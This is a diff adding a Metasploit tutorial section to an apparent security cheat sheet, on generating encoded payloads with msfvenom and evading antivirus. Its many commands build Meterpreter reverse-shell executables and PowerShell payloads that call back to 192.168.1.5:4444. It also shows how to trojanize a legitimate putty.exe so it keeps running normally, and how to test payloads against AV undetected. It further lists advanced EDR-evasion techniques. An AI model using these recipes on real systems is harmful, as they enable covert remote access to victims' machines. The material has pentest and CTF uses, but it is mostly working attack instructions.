@@ -1498,7 +1498,7 @@ msf6 > show encoders
 ```
 
 ### Compatible Encoders
-    ===================
+ 
   | Name     |               Rank   |    Description|
  |  ----              |      ----     |  -----------|
   | cmd/brace    |           low   |     Brace Expansion|
@@ -1550,4 +1550,141 @@ x86/shikata_ga_nai (Japanese for "it can't be helped")
 |----|----|
 |set encoder [name]|	Choose which encoder to use|
 |set iterations [number]|	How many times to encode (1-10, default 1)|
+
+
+## Using Encoders with msfvenom
+
+- Most encoding happens during payload generation with msfvenom.
+
+- **Basic encoded payload:**
+```bash
+  msfvenom -p windows/x64/meterpreter/reverse_tcp
+  LHOST=192.168.1.5 LPORT=4444 -e x86/shikata_ga_nai -f exe -o shell.exe
+```
+- **Multiple iterations (more encoding passes):**
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5
+LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o shell_encoded.exe
+```
+|Flag	|Purpose	|Example|
+|----|----|----|
+|-e|	Encoder to use	|-e x86/shikata_ga_nai|
+|-i	|Iterations|	-i 5 (5 encoding passes)|
+
+
+## Evasion Techniques
+
+- Evasion isn't just about encoders. Multiple techniques can help you avoid detection.
+
+- 1. Use stageless payloads
+Stageless payloads are larger but sometimes bypass certain AV heuristics.
+```bash
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o stageless.exe
+```
+- 2. Use PowerShell instead of EXE
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f psh-reflection -o payload.ps1
+```
+- 3. Use different output formats
+|Format	|Command	|=se Case|
+|EXE|	-f exe	|Windows executables|
+|PowerShell|	-f psh-reflection|	Run from PowerShell|
+|VBA	|-f vba	|Office macros|
+|C	|-f c	|Manual compilation|
+|Python	|-f python|	Cross-platform|
+|Java|	-f jar	|Java applications|
+
+- 4. Embed payload in legitimate executable
+     ```bash
+     msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -x /path/putty.exe -f exe -o putty_backdoor.exe
+     ```
+   - The "-x"flag uses a legitimate executable as a template. The payload runs first, then the original program runs normally.
+
+- 5. Use custom templates
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -x /path/legitimate.exe -k -f exe -o backdoor.exe
+```
+- The "-k" flag runs the payload in a separate thread, keeping the original program functional.
+
+
+
+## Additional Evasion Options
+
+|Flag	|Purpose	|Example|
+|---|----|----|
+|-n	|Add NOP sled	|-n 32 (32 byte NOP sled)|
+|-s	|Maximum size of encoded payload	|-s 4096|
+|-b	|Bad characters to avoid	|-b '\x00\xff'|
+
+- **Bad characters example:**
+ - Some exploits can't handle certain characters (like null bytes \x00). The encoder will avoid generating those characters.
+ ```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -b '\x00\x0a\x0d' -f exe -o shell.exe
+ ```
+
+## Limitations of Encoders
+|Limitation|	Why It Matters|
+|----|----|
+|Modern EDR uses behavior detection|	Encoders only fool signature-based AV|
+|Encoded payloads still run in memory|EDR sees what the payload does, not how it's encoded|
+|Multiple iterations can break payloads|	Over-encoding can corrupt the payload|
+|Some encoders are blacklisted|	Known encoder signatures are detected|
+
+>**Real talk:** Basic encoders like "shikata_ga_nai" won't bypass modern EDR (CrowdStrike, SentinelOne, Defender for Endpoint). For real evasion, you need >advanced techniques like process injection, custom crypters, or living-off-the-land techniques.
+
+
+## The Real Evasion Pyramid
+|Level	|Technique	|Effectiveness|
+|----|----|----|
+|1. Basic	|Encoders (shikata_ga_nai)	|Bypasses old AV only|
+|2. Custom|	Private encoders, custom templates|Better, still may be caught|
+|3. Advanced	|Process injection, unhooking	|Bypasses many EDRs|
+|4. Expert|	BYOVD (Bring Your Own Vulnerable Driver), kernel callbacks	|High-end evasion|
+
+- Your Metasploit encoders are Level 1. Useful for legacy systems and CTFs. Not useful against modern corporate defenses.
+
+
+## Common Encoder Workflows
+
+- Quick encoded EXE:
+ ```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o shell.exe
+```
+
+- Encoded PowerShell payload:
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -e x86/shikata_ga_nai -i 3 -f psh-reflection -o payload.ps1
+```
+
+- Encoded payload embedded in legitimate EXE:
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -x /usr/share/windows-binaries/putty.exe -e x86/shikata_ga_nai -i 5 -f exe -o putty_backdoor.exe
+```
+
+
+## Testing Your Payload
+
+- Before using a payload, test it:
+
+   - Upload to VirusTotal (use a disposable VM, not your real IP)
+
+   - Test against Windows Defender on a local VM
+
+   -  Use online sandboxes (Joe Sandbox, ANY.RUN) with caution
+
+   >Warning: Never upload real payloads to VirusTotal. They'll be shared with AV companies. Use a VPN or test in isolated VMs.
+
+
+
+## Evasion Cheat Sheet
+|Goal|	Command|
+|List encoders|show encoders|
+|Use basic encoder	|set encoder x86/shikata_ga_nai|
+|Multiple iterations (msfconsole)	|set iterations 5|
+|Encoded EXE (msfvenom)	|msfvenom -p [payload] -e [encoder] -f exe -o [file]|
+|Encoded PowerShell	|msfvenom -p [payload] -e [encoder] -f psh-reflection -o [file]|
+|Embed in legitimate EXE	|msfvenom -p [payload] -x [legit.exe] -f exe -o backdoor.exe|
+|Avoid bad characters	|msfvenom -b '\x00\xff'|
+
+
 
